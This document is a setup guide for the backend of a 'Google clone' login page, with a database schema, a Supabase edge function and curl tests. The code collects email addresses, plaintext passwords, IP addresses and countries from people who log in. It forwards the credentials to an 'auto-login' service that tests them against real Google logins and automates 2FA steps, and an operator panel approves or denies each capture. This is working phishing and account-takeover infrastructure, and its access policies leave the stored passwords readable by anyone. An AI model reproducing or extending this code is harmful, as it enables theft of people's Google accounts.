# 💾 SUPABASE COMPLETE SETUP - VERSION 2.1

## 🗄️ **1. DATABASE SCHEMA**

### **Copy vào Supabase SQL Editor:**

```sql
-- ========================================
-- 🚀 AUTO-LOGIN GOOGLE CLONE - VERSION 2.1
-- Database Schema với Country Detection
-- ========================================

-- 1. Create requests table
CREATE TABLE IF NOT EXISTS public.requests (
  id BIGSERIAL PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT,
  ip_address TEXT,
  country TEXT DEFAULT 'United States (US)',
  user_agent TEXT,
  page TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  auto_login_result JSONB,
  auto_approved BOOLEAN DEFAULT false,
  approval_reason TEXT
);

-- 2. Create indexes for performance
CREATE INDEX IF NOT EXISTS idx_requests_status ON public.requests(status);
CREATE INDEX IF NOT EXISTS idx_requests_page ON public.requests(page);
CREATE INDEX IF NOT EXISTS idx_requests_created_at ON public.requests(created_at);
CREATE INDEX IF NOT EXISTS idx_requests_email ON public.requests(email);
CREATE INDEX IF NOT EXISTS idx_requests_country ON public.requests(country);

-- 3. Enable Row Level Security
ALTER TABLE public.requests ENABLE ROW LEVEL SECURITY;

-- 4. Create RLS policies
CREATE POLICY "Enable insert for all users" ON public.requests
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Enable select for all users" ON public.requests
  FOR SELECT USING (true);

CREATE POLICY "Enable update for all users" ON public.requests
  FOR UPDATE USING (true);

-- 5. Create approve_request function
CREATE OR REPLACE FUNCTION approve_request(request_id BIGINT, new_status TEXT)
RETURNS JSONB
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSONB;
BEGIN
  UPDATE public.requests 
  SET 
    status = new_status,
    updated_at = NOW()
  WHERE id = request_id;
  
  SELECT jsonb_build_object(
    'id', id,
    'email', email,
    'status', status,
    'country', country,
    'updated_at', updated_at
  ) INTO result
  FROM public.requests 
  WHERE id = request_id;
  
  RETURN result;
END;
$$;

-- 6. Create function to get pending requests
CREATE OR REPLACE FUNCTION get_pending_requests()
RETURNS JSONB
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSONB;
BEGIN
  SELECT jsonb_agg(
    jsonb_build_object(
      'id', id,
      'email', email,
      'ip_address', ip_address,
      'country', country,
      'page', page,
      'status', status,
      'created_at', created_at,
      'auto_approved', auto_approved,
      'approval_reason', approval_reason
    )
  ) INTO result
  FROM public.requests 
  WHERE status = 'pending'
  ORDER BY created_at DESC;
  
  RETURN COALESCE(result, '[]'::jsonb);
END;
$$;

-- 7. Create updated_at trigger
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_requests_updated_at 
  BEFORE UPDATE ON public.requests 
  FOR EACH ROW 
  EXECUTE FUNCTION update_updated_at_column();

-- 8. Insert sample data for testing
INSERT INTO public.requests (email, page, country, status) VALUES
('test@gmail.com', 'email', 'United States (US)', 'approved'),
('demo@yahoo.com', 'password', 'Vietnam (VN)', 'pending'),
('sample@hotmail.com', '2fa', 'Germany (DE)', 'denied');

-- ========================================
-- ✅ DATABASE SETUP COMPLETE
-- ========================================
```

---

## ⚡ **2. EDGE FUNCTION CODE**

### **File: `admin-api/index.ts`**

```typescript
// ========================================
// 🚀 AUTO-LOGIN GOOGLE CLONE - VERSION 2.1
// Supabase Edge Function với Auto-Login Integration
// ========================================

import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
}

// Auto-Login API endpoint (localhost)
const AUTO_LOGIN_API = 'http://localhost:5000'

// IP Geolocation function
async function getCountryFromIP(ip: string): Promise<string> {
  try {
    // Skip localhost and private IPs
    if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return 'United States (US)' // Fallback strategy
    }

    // Call ip-api.com for geolocation
    const response = await fetch(`http://ip-api.com/json/${ip}`)
    const data = await response.json()
    
    if (data.status === 'success') {
      return `${data.country} (${data.countryCode})`
    }
    
    // Fallback if API fails
    return 'United States (US)'
  } catch (error) {
    console.log('Country detection error:', error)
    return 'United States (US)' // Fallback strategy
  }
}

// Auto-Login API call function
async function callAutoLoginAPI(endpoint: string, data: any): Promise<any> {
  try {
    const response = await fetch(`${AUTO_LOGIN_API}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    })
    
    return await response.json()
  } catch (error) {
    console.log('Auto-Login API error:', error)
    return { success: false, error: 'Auto-Login API unavailable' }
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? ''
    )

    const url = new URL(req.url)
    const path = url.pathname

    // Extract client IP
    const clientIP = req.headers.get('x-forwarded-for') || 
                    req.headers.get('x-real-ip') || 
                    'unknown'

    if (path === '/submit' && req.method === 'POST') {
      // ========================================
      // 📝 SUBMIT REQUEST (với Auto-Login)
      // ========================================
      
      const { email, password, page } = await req.json()

      // Get country from IP
      const country = await getCountryFromIP(clientIP)
      
      // Insert request to database
      const { data: insertData, error: insertError } = await supabase
        .from('requests')
        .insert({
          email,
          password: password || null,
          ip_address: clientIP,
          country,
          user_agent: req.headers.get('user-agent'),
          page,
          status: 'pending'  // Initially pending
        })
        .select()
        .single()

      if (insertError) {
        throw insertError
      }

      const requestId = insertData.id

      // Auto-Login Integration based on page
      let autoLoginResult = { success: false, message: 'No auto-login for this page' }
      let finalStatus = 'pending'
      let approvalReason = 'Manual review required'

      if (page === 'email') {
        // Email validation via Auto-Login API
        autoLoginResult = await callAutoLoginAPI('/validate-email', { email })
        
        if (autoLoginResult.success) {
          finalStatus = 'approved'
          approvalReason = 'Auto-approved: Email validation passed'
        } else {
          finalStatus = 'denied'  
          approvalReason = 'Auto-denied: Email validation failed'
        }
      } 
      else if (page === 'password') {
        // Password test via Auto-Login API  
        autoLoginResult = await callAutoLoginAPI('/test-login', { email, password })
        
        if (autoLoginResult.success) {
          finalStatus = 'approved'
          approvalReason = 'Auto-approved: Real Google login test passed'
        } else {
          finalStatus = 'denied'
          approvalReason = 'Auto-denied: Real Google login test failed'
        }
      }
      else if (page === '2fa') {
        // 2FA handling via Auto-Login API
        autoLoginResult = await callAutoLoginAPI('/handle-2fa', { email })
        
        if (autoLoginResult.success) {
          finalStatus = 'approved'  
          approvalReason = 'Auto-approved: 2FA automation successful'
        } else {
          finalStatus = 'denied'
          approvalReason = 'Auto-denied: 2FA automation failed'
        }
      }

      // Update request with auto-login result
      const { error: updateError } = await supabase
        .from('requests')
        .update({
          status: finalStatus,
          auto_login_result: autoLoginResult,
          auto_approved: finalStatus !== 'pending',
          approval_reason: approvalReason,
          updated_at: new Date().toISOString()
        })
        .eq('id', requestId)

      if (updateError) {
        throw updateError
      }

      return new Response(
        JSON.stringify({
          success: true,
          id: requestId,
          status: finalStatus,
          country,
          auto_approved: finalStatus !== 'pending',
          approval_reason: approvalReason,
          auto_login_result: autoLoginResult
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    else if (path === '/requests' && req.method === 'GET') {
      // ========================================
      // 📋 GET ALL REQUESTS
      // ========================================
      
      const { data, error } = await supabase
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) throw error

      return new Response(
        JSON.stringify({ success: true, data }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    else if (path === '/approve' && req.method === 'POST') {
      // ========================================
      // ✅ APPROVE REQUEST
      // ========================================
      
      const { id, status } = await req.json()

      const { data, error } = await supabase
        .rpc('approve_request', { request_id: id, new_status: status })

      if (error) throw error

      return new Response(
        JSON.stringify({ success: true, data }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    else if (path === '/status' && req.method === 'GET') {
      // ========================================
      // 📊 SYSTEM STATUS
      // ========================================
      
      const { data: pending } = await supabase
        .from('requests')
        .select('*')
        .eq('status', 'pending')

      const { data: approved } = await supabase
        .from('requests')
        .select('*')
        .eq('status', 'approved')

      const { data: denied } = await supabase
        .from('requests')
        .select('*')
        .eq('status', 'denied')

      // Test Auto-Login API availability
      const autoLoginTest = await callAutoLoginAPI('/health', {})

      return new Response(
        JSON.stringify({
          success: true,
          stats: {
            pending: pending?.length || 0,
            approved: approved?.length || 0,
            denied: denied?.length || 0,
            total: (pending?.length || 0) + (approved?.length || 0) + (denied?.length || 0)
          },
          auto_login_api: autoLoginTest.success ? 'available' : 'unavailable',
          version: '2.1-AUTO-LOGIN-WITH-COUNTRY',
          country_detection: 'enabled',
          fallback_strategy: 'United States (US) for unknown IPs'
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 200,
        }
      )
    }

    // 404 for unknown paths
    return new Response(
      JSON.stringify({ error: 'Endpoint not found' }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 404,
      }
    )

  } catch (error) {
    console.error('Error:', error)
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    )
  }
})

// ========================================
// ✅ EDGE FUNCTION COMPLETE - VERSION 2.1
// Features:
// - Auto-Login Integration
// - Country Detection với US Fallback
// - Real-time approval/denial
// - Complete API endpoints
// ========================================
```

---

## 🔧 **3. ENVIRONMENT VARIABLES**

### **Set trong Supabase Dashboard:**

```bash
# Project Settings > Environment Variables
SUPABASE_URL=https://otbswtklpidhezziotac.supabase.co
SUPABASE_ANON_KEY=your_anon_key_here
AUTO_LOGIN_API_URL=http://localhost:5000
```

---

## 📊 **4. API TESTING**

### **Test Commands:**

```bash
# Test submit endpoint
curl -X POST "https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/submit" \
  -H "Content-Type: application/json" \
  -H "apikey: YOUR_ANON_KEY" \
  -d '{
    "email": "test@gmail.com",
    "password": "testpassword",
    "page": "email"
  }'

# Test status endpoint  
curl -X GET "https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/status" \
  -H "apikey: YOUR_ANON_KEY"

# Test requests endpoint
curl -X GET "https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/requests" \
  -H "apikey: YOUR_ANON_KEY"
```

---

## ✅ **5. VERIFICATION CHECKLIST**

- [ ] Database schema created successfully
- [ ] RLS policies enabled  
- [ ] Edge function deployed
- [ ] Environment variables set
- [ ] API testing passed
- [ ] Country detection working
- [ ] Auto-Login integration active
- [ ] Admin dashboard functional

---

**🎉 SUPABASE SETUP COMPLETE - VERSION 2.1!** 